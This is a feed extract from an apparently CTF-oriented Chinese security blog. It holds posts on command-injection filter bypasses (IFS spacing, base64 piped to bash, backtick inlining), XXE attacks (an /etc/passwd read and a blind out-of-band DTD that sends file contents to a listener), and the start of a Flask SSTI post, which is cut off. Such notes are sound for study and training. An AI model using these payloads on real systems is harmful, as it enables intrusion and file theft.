63f7799cb900e66b9dea3b9f44b5f857cfb5ae84c63f7ebf54d1e3f535fe8d87b3095e458b07334ddf1517d3e492a36ca06837fb66e9f51b295bd98ada01c437ea31f1d8e3d805f643b806ff305db355ad3314ea4ef5c15ed581686a65dfbc3b89ad92cf746a6f21c6e8d13f177a21d6ab57b7e68eac5c2cff0d65bc9db1013b9cc6d63d806112a96984043368f845509da43deebe6f402f574fd94106c9883dd9b51ef7456c1a10c2d233ae851b0debab1a0189a35fa3e6fa78a4252e634e8a61a6c18f28df713fa88ac72eb8d8a579723f2280a6082cbe2b343e2b46b968ad5beccd9a3a6dcaff6eac8fd5c7bf0b6bd4ba45749a262b79d068bb461f2fd7748f6e45914cec98e3af6843e9e8b0125e89ced2a65abf5392fd6e0eb3c9ff1fe9b97beaab4704a2e8fa4f4bd58df153b9fd39432fc04d26e6922adb57ced660a0c7f5aeab5f6dddfce814dabeab51142a89057897c77b0dd95f08399d68afa66ae8e55a8f30332e7ccc652cacbd9c4870f1b87ccf275af969b338693e7c07a7f7a98e033671d418f2cfe65275f1cc9865babc04f217f1e194bd0ae3ff45248d44bd544874357542d772e5fa26abac26dca81f56e2412a75255e526726cfe4f6c4e9139e71e7400da5b8a2af3686627b47671a0a0e6d7021b8f96f12dab320b27a505609f43780ff9f4d1809aeb8b44d1549b5c1292fdb69d92a6a805d9e7acc9b0c664bff273d908270b3c3e26643a676585c6fa7278595a1c556b16ececb69f0bb51fb7dd044f6bf83b9a9688da3f89825ef6eaee598694684c758f3c43b9c490736d03a2dc6510c5521194b4fae4e98f1c46731d9d06256e149d3290dcca8bed3e041514a5bbebee08c2a47d096fbbab93f5d809227f549a8714df85296852f36dbd2a29834fb456d73055f8160cc5ad8c9d57936f7c6a602dde444b01ba79c0935dbc1ca1686ac333f70ae8bf81009942392020af9714a30db92b7ad4775e6e1deecf16ae9e445ff01971411af64e52a994647656807995e8c6dac9f42cb98fb984b0704d909414316983bfff18feaf1ad3a38728114691687344d060bfe18d54a82675a2d4483c4e0f62e3b4793025ccc063ab091dc7e9d185840a4782a4bfe317b98eee49a3d799feabaa41c72c478ae38087883fb9462d9114547c568b3c0650412f7e8b2c0b8dbd887265fec46dc41ba19b23d83714c36c1c7c2a922ce14033ad41b58ed59b447a4f4d4dfec6b5ad05a31ec09a55d090eb9a01948aadb5db1cdcfaf4bb48e25b5e618be985c082cb36f0f5e42678f0152669b03cf655ceb40c5597d89f7c5c1194449af1ab791bc8a847b5f10781f39a98a9a06fd377088db0e2d0e15d93fc94aa7981c93df33b5d1498cf9efe5662f1f9d757893309c91e66b4bdc95e91b76ee3c27829fba7c7063012c7678518504f0d93c27c8384a2c1e3e02dadd4f5016fca40d6d79b9e57e9b6fffc5a911cf94fe348712904b1bcdfa31e85ee50147f6a8c7692d9060a44d82b7e1347c154ec5368440d8994103fd57259d76ee22ca92e2f4d46e4d5b8859f45c5e46e0736f27e7b10ea51a9f29838a04a43f93693fcf41800c070fb75484adc7ab05ef2a4e18f88751709b633cc77ebf3bae4179040431709a34a00df6694f821d2a88afe7bb090501214321f2b305d26feb62be6efd3443fc61ff5d72847af58fe9eaa3fb3d97453e1196aefdafd204762f463d9ca83e4e2ef3119d9ddef1d02dd9c7085d5bc9a6371501caa055c3e420c6f5a28b9e23d384d8a32160cf6ec34f7a97239fa76b189c54e6fee8617e37f45207435227a918793fad7ca1afe9b44302caf9241a6a4e806f386c10b459496fdb3246a31ab5f61b1173a19fad853e90d10e5228174eef46dce48153dc67dd59ac3980ce8d4e53473ce973401439d0f9570b46ecd66a845d79dc493c8e389e394990ca340cf7e89857c9cfdf01dd6a77933a5982621a64c173dfe4d993d4cadf179c840188f055598787599246a711c3c2c50314ae1278c13af04b15063ec74cce40175689bf80dadb3c8336111bd2e63cb54d53e1bd90d8c6ced2c21c9ce091bf88e0096545a1d1f331c989e1253caa81e353e4738b6e513aaca851872e0c0df5ef79466ba3734f38170fde899b00e108ec3f9c80e80b08845f90ae3b272e4eb831af97b2241b21c6773cd40498ea654f55178c9ec6382195a00abc9bd25991e39002fbf8382e2ebed07c6ab08f3857d83c25d4ac8ec6e1313adc44ed3b17b7b299f7c142ff95d6d52e937f99121edf286289a993da44ead296175b98f34cd129499de455663b125b08399daaad1ad94519cb62c4374393f1df109bf1b9f60d4ff7861a6c2a806cb62acf34a25af5b72a279991c4894c899a59b1c5aeed5fad3ba3f7d01bef5a39af18d9a7005a536046cca2a65f6233dee168915e29724d6b33a3131b8d110858aa5ac9eda4b4d1fcc642b72cdb3968075bf64866ad62e224283e50e9d57207c8c1ec76bab0b66f5702b757f1b4feadf2b962066b71dc3cbf602d9996f3100439561c119743f6acb97193c5b32e428b7cb59892df80bf3941cdb22cb948ba5bb09e0aa551475d96c79b9c1f8664d311b91f0456bc785b4708f00c585058b201a9782e03d5c39aa8749b7a34fd1bcc7d83baf11b8fe4c6844e5138aaeb7a17913f7fde3c23a94265d45a46fc1b552bb890b4c3377a3c1a30883ca69f29e7128905226839ec55ad3237bb85af87bc26965deb17ed09c27890ff74dc27c620d507f9939a15f9c0550564092f7f0979327fc1906a378733ed3ad84bee93e04202856bb0e0c4bf7c3095910c1a252d36810cc65c745cedd3a6fc695f62ac405ceea766210b1c950d7b9d669fa0280bfde3a939d16ef08e7f4b4b38dc8fcfb713df278c3403478fedf5a2f81bfe92034d7e0dc5fd7ed4ab3a4f54fb5e679e6e11564f6be50fad00a83084925bf2464fb2254026948e6c8b022097fcb8002843b800f263a59e6dbde50adc02585c4641744bd4ec995cbce609e5eade9ca1565e087abd5203b25b3876a5c6c04ba7d2b23ca5700a201fd5f0bd341452abdeae64d97920f51343234469a877b90351c5c9978b68c43b3f0b5956bd1156c46eaaa670c3c9cb75162283cf1837721423c59fa5cfca44bd89bee8eb90b4356176d249dc5d21c314d680a5460d2c04c50c02a0ca0c5f182e8f715cceb9a22dbf9ad8fcf2a9cbf1bb0a8247523937ea5c9b71b582b2913a028b93e57cdf954787e7726e5f988a884deadd6e2ccb153580c9d0cb730278a9029adf0b55774cea07df931d1efce081e53f677bd833f203749d7321f9b77fba2f9794656f908f1f34a911fc3d9042f8c8777cbc4b1b7e09048c323f767c41cbf5b82cc91969f3d25cfc2124f78a68bb8cc2eca6db36910cdff523cbc57fd960950313ec4da73da4c89e66c198e633439356b17cbd4f3d5fdc88f74e0a7d41f83fa4c56a508dbababc5810f794350925d645bfe40472da0e920fe71523f2607deae8977e56c764c7285d1f7f725acb2094f6c6871985761f595aff0390c2060d7461a79fa085bef6083f927aa26507bae569ade3ee34fb5361e4d6fbda24b2f1ed3b413d6c6575b476bc9403a8d8b15d98298c1efbe1553f10022224c38b61aa95a07f37dbbe26cc3e95fd1e064402b2af9321058728a98c7a790422d7a6096c122f0fe7df21aa559a1814dde84329b3d1c1f511b15e47e5fe63a3a476f805f110730fba4f7ff16eb1eb140269ad7393ae002d1a00be71dae2e54315faed2bff79d8e9db4c69e91060ebff416ae9317e370a8786ef24a66ae39593371a5bcde8d11253503401aa4e4e653c415276e99b134aeffdbb6ba66acf71ceecebf21c04ac09a661e4177d44f6cf6082da45f82247cb7252f4bf9230f70287ccce43440dee1cc4759335081dc4ec0cd43c46d41e22ab5318eb671cbdb3ec3dcd74491c3b7eacabe7f341e2d1348e99d3f94f7f102d68ca136bd28397f308797efe22d09c058a3dfdbe49263139d34f980</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="出题笔记" scheme="http://yoursite.com/categories/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="出题" scheme="http://yoursite.com/tags/%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>命令执行tricks</title>
    <link href="http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    <id>http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/</id>
    <published>2020-04-07T08:42:11.000Z</published>
    <updated>2020-04-07T13:15:27.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-命令联合执行"><a href="#0x-01-命令联合执行" class="headerlink" title="0x 01 命令联合执行"></a>0x 01 命令联合执行</h3><p>常用的命令分隔符：</p><ul><li>; </li><li>&amp;&amp; </li><li>|| </li><li>%0a </li><li>%0d </li><li>| (管道符)  </li></ul><h3 id="0x-02-bypass技巧"><a href="#0x-02-bypass技巧" class="headerlink" title="0x 02 bypass技巧"></a>0x 02 bypass技巧</h3><p><strong>空格过滤</strong></p><ul><li>$IFS</li><li>${IFS}</li><li>$IFS$9</li><li>&lt;</li><li>&lt;&gt;</li><li>{cat,flag.php} //用逗号实现了空格功能，需要用<code>{}</code>括起来</li><li>%20</li><li>%09 </li></ul><p><strong>关键字黑名单绕过</strong></p><ul><li><p>ca\t flag\g.php    反斜线绕过</p></li><li><p>cat fl”ag.php     两个单引号绕过</p></li><li><p>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash    base64编码绕过(引号可以去掉)</p></li><li><p>echo “63617420666C61672E706870” | xxd -r -p | bash    hex编码绕过(引号可以去掉)</p></li><li><p>cat fl[a]g.php    用<code>[]</code>匹配</p></li><li><p>cat fla*    用<code>*</code>匹配任意</p></li><li><p>内联执行</p><p>所谓内联执行，就是将反引号内命令的输出作为另一个命令的输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS$9&#96;ls&#96;</span><br></pre></td></tr></table></figure></li></ul><h3 id="0x-03-查看文件内容的常见命令"><a href="#0x-03-查看文件内容的常见命令" class="headerlink" title="0x 03 查看文件内容的常见命令"></a>0x 03 查看文件内容的常见命令</h3><p>参考这篇文章：<a href="https://blog.csdn.net/x7418520/article/details/81064861" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81064861</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">cat     由第一行开始显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">tac     从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line"></span><br><span class="line">more    根据窗口大小，一页一页的现实文件内容</span><br><span class="line"></span><br><span class="line">less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line"></span><br><span class="line">head    只显示头几行</span><br><span class="line"></span><br><span class="line">tail    只显示最后几行</span><br><span class="line"></span><br><span class="line">nl      类似于cat -n，显示时输出行号</span><br><span class="line"></span><br><span class="line">tailf   类似于tail -f </span><br><span class="line">cut -b 1 flag      &#x2F;&#x2F;-b 可以逐位读取。</span><br><span class="line">a&#x3D;&#96;expr substr $PATH 1 1&#96;;b&#x3D;fla;c&#x3D;g.php;d&#x3D;ca;e&#x3D;t;$d$e ..$a$b$c;</span><br><span class="line">&#x2F;&#x2F; 利用环境变量来获取&#x2F;： expr substr $PATH 1 1 &#x3D;&gt;&#x2F;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1799.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-命令联合执行&quot;&gt;&lt;a href=&quot;#0x-01-命令联合执行&quot; class=&quot;headerlink&quot; title=&quot;0x 01 命令联合执行&quot;&gt;&lt;/a&gt;0x 01 命令联合执行&lt;/h3&gt;&lt;p&gt;常用的命令分隔符：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;; &lt;/li&gt;
      
    
    </summary>
    
    
      <category term="tricks" scheme="http://yoursite.com/categories/tricks/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="命令执行tricks" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    
  </entry>
  
  <entry>
    <title>xxe漏洞总结</title>
    <link href="http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-07T07:25:13.000Z</published>
    <updated>2020-04-07T08:38:38.715Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><p><strong>XML基础知识</strong></p><p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><h3 id="XML语法规则如下："><a href="#XML语法规则如下：" class="headerlink" title="XML语法规则如下："></a>XML语法规则如下：</h3><ol><li><strong>所有的XML元素都必须有一个关闭标签</strong></li><li><strong>XML标签对大小写敏感</strong></li><li><strong>XML必须正确嵌套</strong></li><li><strong>XML属性值必须加引号””</strong></li><li><strong>实体引用</strong>（在标签属性，以及对应的位置值可能会出现&lt;&gt;符号，但是这些符号在对应的XML中都是有特殊含义的，这时候我们必须使用对应html的实体对应的表示，比如&lt;傅好对应的实体就是lt，&gt;符号对应的实体就是gt）</li><li>在XML中，空格会被保留（案例如：<p>a空格B</p>，这时候a和B之间的空格就会被保留）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  &#x2F;&#x2F;xml声明</span><br><span class="line">&lt;!DOCTYPE copyright [        &#x2F;&#x2F;DTD(文档类型定义)</span><br><span class="line">&lt;!ELEMENT note (to,reset,login)&gt;   &#x2F;&#x2F;定义元素</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;url&quot;&gt;        &#x2F;&#x2F;定义外部实体test</span><br><span class="line">]&gt;</span><br><span class="line">&lt;to&gt;</span><br><span class="line">&lt;reset&gt;                    &#x2F;&#x2F;下面为文档元素</span><br><span class="line">  &lt;login&gt;&amp;test;&lt;&#x2F;login&gt;            &#x2F;&#x2F;调用test实体（此步骤不可缺）</span><br><span class="line">  &lt;secret&gt;login&lt;&#x2F;secret&gt;</span><br><span class="line">&lt;&#x2F;reset&gt;</span><br><span class="line">&lt;to&gt;</span><br></pre></td></tr></table></figure><p><strong>XML DTD介绍</strong></p><p>DTD文档类型定义，约束了xml文档的结构。拥有正确语法的XML被称为“形式良好”的XML，通过DTD验证约束XML是“合法”的XML。</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&#x2F;&#x2F;这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;</span><br><span class="line">&lt;receiver&gt;Myself&lt;&#x2F;receiver&gt;</span><br><span class="line">&lt;sender&gt;Someone&lt;&#x2F;sender&gt;</span><br><span class="line">&lt;header&gt;TheReminder&lt;&#x2F;header&gt;</span><br><span class="line">&lt;msg&gt;This is an amazing book&lt;&#x2F;msg&gt;</span><br><span class="line">&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>DTD实体介绍</strong></p><ul><li><p>实体定义</p><p>实体是用于定义引用普通文本或者特殊字符的快捷方式的变量</p></li></ul><p>在DTD中的实体类型，一般分为：内部实体和外部实体，细分又分为一般实体和参数实体。除外部参数实体引用以字符（%）开始外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p><p><strong>内部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01b0b455cabdadf651.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p> <strong>外部实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t01a5b9284363aff87d.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>外部参数实体：</strong></p><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/E:%5CHexo-Blog%5Csource_posts%5Cxxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%5Ct01755d18a3adf6383c.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 &quot;实体内容”&gt;</span><br></pre></td></tr></table></figure><h3 id="0x-02-XML注入产生的原理"><a href="#0x-02-XML注入产生的原理" class="headerlink" title="0x 02 XML注入产生的原理"></a>0x 02 XML注入产生的原理</h3><p>​    XXE漏洞全称XML External Entity  Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p><h3 id="0x-03-常见攻击方法"><a href="#0x-03-常见攻击方法" class="headerlink" title="0x 03 常见攻击方法"></a>0x 03 常见攻击方法</h3><h4 id="3-1-有回显读本地敏感文件-Normal-XXE"><a href="#3-1-有回显读本地敏感文件-Normal-XXE" class="headerlink" title="3.1 有回显读本地敏感文件(Normal XXE)"></a>3.1 有回显读本地敏感文件(Normal XXE)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;&lt;password&gt;admin&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p>注意：</p><blockquote><p>直接读取php文件会报错，因为php文件里面有&lt;&gt;//等特殊字符，xml解析时候会当成xml语法来解析。这时候就分不清处哪个是真正的xml语句了，</p><p>直接利用file协议读取PHP文件，就会产生报错，那么需要base64编码来读取</p></blockquote><h4 id="3-2-无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#3-2-无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="3.2 无回显读取本地敏感文件(Blind OOB XXE)"></a>3.2 无回显读取本地敏感文件(Blind OOB XXE)</h4><ul><li>攻击流程：<ol><li>客户端发送payload 1给web服务器</li><li>web服务器向vps获取恶意DTD，并执行文件读取payload2</li><li>web服务器带着回显结果访问VPS上特定的FTP或者HTTP</li><li>通过VPS获得回显（nc监听端口）</li></ol></li></ul><p>我们选择使用外部DTD，在主机上编写一个dtd文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM “PHP:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd”&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all “&lt;!ENTITY send SYSTEM ‘监听的url+端口&#x2F;?file;’&gt;”&gt;</span><br><span class="line"></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t014afb0a837226463c.png" alt></p><p>Payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;”1.0” encoding&#x3D;”utf-8” ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DDOCTYPE root SYSTEM “dtd文件”&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/07/xxe%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/t0177676f0a5d14e921.png" alt></p><p>我们先声明一个外部的DTD引用，然后再xml文档内容中引用外部DTD中的一般实体。</p><h4 id="3-3-HTTP-内网主机探测"><a href="#3-3-HTTP-内网主机探测" class="headerlink" title="3.3 HTTP 内网主机探测"></a>3.3 HTTP 内网主机探测</h4><p>我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;net&#x2F;fib_trie  路由树</span><br><span class="line">&#x2F;etc&#x2F;hosts  linux系统中负责ip地址与域名快速解析的文件</span><br><span class="line">&#x2F;proc&#x2F;net&#x2F;arp  &#x2F;&#x2F;arp表，可以获得内网其他机器的地址</span><br></pre></td></tr></table></figure><p>利用http协议继续访问内网主机或者进行内网主机端口扫描</p><p>最后放一个payload集合：<a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></p><p>参考资料：</p><blockquote><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p><a href="https://www.anquanke.com/post/id/197423" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197423</a></p><p><a href="https://xz.aliyun.com/t/6887" target="_blank" rel="noopener">https://xz.aliyun.com/t/6887</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-基础知识&quot;&gt;&lt;a href=&quot;#0x-01-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x 01 基础知识&quot;&gt;&lt;/a&gt;0x 01 基础知识&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;XML基础知识&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XML用于标
      
    
    </summary>
    
    
      <category term="web基础知识" scheme="http://yoursite.com/categories/web%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="xxe漏洞" scheme="http://yoursite.com/tags/xxe%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>flask模板注入总结</title>
    <link href="http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/05/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-05T15:34:51.000Z</published>
    <updated>2020-05-09T14:08:27.368Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-基础知识"><a href="#0x-01-基础知识" class="headerlink" title="0x 01 基础知识"></a>0x 01 基础知识</h3><blockquote><p>参考这篇文章：<a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">从零学习flask模板注入</a></p></blockquote><p>漏洞原理：不正确的使用flask中的<code>render_template_string()</code>导致的<code>SSTI</code>，并且<strong>模板内容直接受用户控制</strong></p><p>注意：理论上不同机器、不同python版本的payload是不尽相同的。</p><p>测试代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def test():</span><br><span class="line">    code &#x3D; request.args.get(&#39;id&#39;)</span><br><span class="line">    html &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &#39;&#39;&#39;%(code)</span><br><span class="line">    return render_template_string(html)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(host&#x3D;&#39;0.0.0.0&#39;)</span><br></pre></td></tr></table></figure><p><strong>文件读取/命令执行</strong></p><p>无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类``，再寻找子类，最后找到我们需要用到的相应模块</p><p><strong>几个要用到的魔术方法</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><h3 id="0x-02-Python2-环境下测试"><a href="#0x-02-Python2-环境下测试" class="headerlink" title="0x 02 Python2 环境下测试"></a>0x 02 Python2 